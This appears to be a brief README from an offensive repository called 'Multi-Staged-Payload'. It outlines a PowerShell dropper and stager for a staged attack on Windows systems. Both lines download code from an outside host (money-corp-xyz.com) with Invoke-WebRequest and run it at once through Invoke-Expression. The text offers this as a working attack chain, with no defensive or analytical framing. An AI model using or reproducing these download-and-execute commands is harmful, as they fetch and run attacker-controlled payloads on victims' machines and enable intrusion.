# Multi-Staged-Payload


COMPSEC -> C:\Windows\System32\cmd.exe

Create_Dropper.ps1
$Payload = "$ProxyAware;iwr http://www.money-corp-xyz.com/stager -UseBasicParsing -UserAgent '$UA'|iex"

Stager
$ProxyAware;iwr http://www.money-corp-xyz.com/psh-cmd.load -UseBasicParsing -UserAgent $UA|iex


